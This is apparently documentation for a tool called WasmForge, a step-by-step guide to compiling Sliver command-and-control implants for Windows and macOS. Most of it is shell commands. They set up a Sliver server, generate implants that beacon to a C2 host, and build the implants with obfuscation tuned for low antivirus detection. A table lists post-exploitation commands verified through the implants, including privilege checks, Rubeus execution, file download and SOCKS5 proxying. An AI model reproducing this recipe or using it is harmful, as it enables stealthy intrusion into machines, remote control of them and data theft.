# Building Sliver with WasmForge

WasmForge can compile [Sliver](https://github.com/BishopFox/sliver) C2 implants for both Windows and macOS. Sliver generates platform-specific implant source code, so you must generate the source targeting the correct OS from a Sliver server.

## Prerequisites

Download a Sliver server and client for your build host from the [Sliver releases page](https://github.com/BishopFox/sliver/releases):

```bash
# macOS ARM build host example (adjust for your platform)
curl -L -o /tmp/sliver-server \
  https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_darwin-arm64
curl -L -o /tmp/sliver-client \
  https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_macos-arm64
chmod +x /tmp/sliver-server /tmp/sliver-client
```

## Step 1: Start the Sliver Server

```bash
# First-time setup: unpack assets
/tmp/sliver-server unpack --force

# Start the daemon
/tmp/sliver-server daemon &

# Create an operator config and import it into the client
/tmp/sliver-server operator --name localtest --lhost 127.0.0.1 --permissions all --save /tmp/localtest.cfg
/tmp/sliver-client import /tmp/localtest.cfg
```

## Step 2: Generate Implant Source

Connect to the server and generate an implant. Sliver saves the source code to `~/.sliver/slivers/{os}/{arch}/{NAME}/src/`.

```bash
# Start an HTTPS listener (if not already running)
# Then generate the implant from inside the Sliver client:

# For Windows:
# generate --os windows --arch amd64 --http https://YOUR_C2_SERVER:8443 --save /tmp/sliver-win --skip-symbols

# For macOS:
# generate --os darwin --arch amd64 --http https://YOUR_C2_SERVER:8443 --save /tmp/sliver-mac --skip-symbols

# For session mode (interactive, supports SOCKS5 proxy):
# generate session --os darwin --arch amd64 --http https://YOUR_C2_SERVER:8443 --save /tmp/sliver-session --skip-symbols
```

Copy the generated source to a working directory:

```bash
# Find the generated source (NAME is shown in Sliver's output)
cp -r ~/.sliver/slivers/darwin/amd64/IMPLANT_NAME/src /tmp/sliver-darwin-src
# or for Windows:
cp -r ~/.sliver/slivers/windows/amd64/IMPLANT_NAME/src /tmp/sliver-win-src
```

## Step 3: Build with WasmForge

```bash
# Build wasmforge
GOWORK=off go build -o /tmp/wasmforge-bin ./cmd/wasmforge

# Windows target (--ghost traefik recommended for lowest VT detection)
GOWORK=off GOOS=windows GOARCH=amd64 /tmp/wasmforge-bin build \
  --ghost traefik \
  --win32-apis \
  -v \
  -o /tmp/sliver-implant.exe \
  /tmp/sliver-win-src/

# macOS target (no flag needed — auto-detected)
GOWORK=off GOOS=darwin GOARCH=amd64 /tmp/wasmforge-bin build \
  -v \
  -o /tmp/sliver-implant \
  /tmp/sliver-darwin-src/
```

## Important Notes

- **Platform-specific source.** Windows and macOS Sliver sources are NOT interchangeable. Windows `runner.go` references `handlers.WrapperHandler` (token impersonation) which only exists in `handlers_windows.go`. Always generate source targeting the correct OS.
- **Beacon vs Session.** Beacons check in periodically (tasks are queued). Sessions are interactive and support SOCKS5 proxying. Choose based on your use case.
- **`--skip-symbols`.** Recommended to reduce compile time. Sliver's symbol obfuscation adds significant build time and isn't needed since WasmForge already provides its own obfuscation layers.
- **`--tags`.** Use for programs that gate features behind build tags (e.g., `-tags "shell,ps,netstat"` to enable specific command handlers in an agent that supports it).
- **Binary sizes.** ~34.5MB (Windows), ~29.7MB (macOS).

## Verified Commands

| Platform | C2                                                     | Mode    | Commands Tested                                                                                  |
| -------- | ------------------------------------------------------ | ------- | ------------------------------------------------------------------------------------------------ |
| Windows  | Sliver                                                 | Beacon  | `whoami`, `ls`, `pwd`, `execute`, `info`, `getprivs`, `ps`, `netstat`, `ifconfig`, `execute-assembly` (Rubeus, Seatbelt) |
| macOS    | Sliver                                                 | Beacon  | `pwd`, `ls`, `download`, `mkdir`, `execute`                                                      |
| macOS    | Sliver                                                 | Session | `pwd`, `ls`, `download`, `mkdir`, `execute`, SOCKS5 proxy                                        |

## Related Documentation

- [Main README](../README.md) — quick start and feature overview
- [GHOST-PROFILES.md](./GHOST-PROFILES.md) — anti-detection profiling (recommended for Windows targets)
- [MACOS.md](./MACOS.md) — macOS framework bridge details
- [CSHARP.md](./CSHARP.md) — compiling Rubeus / Seatbelt for `execute-assembly`
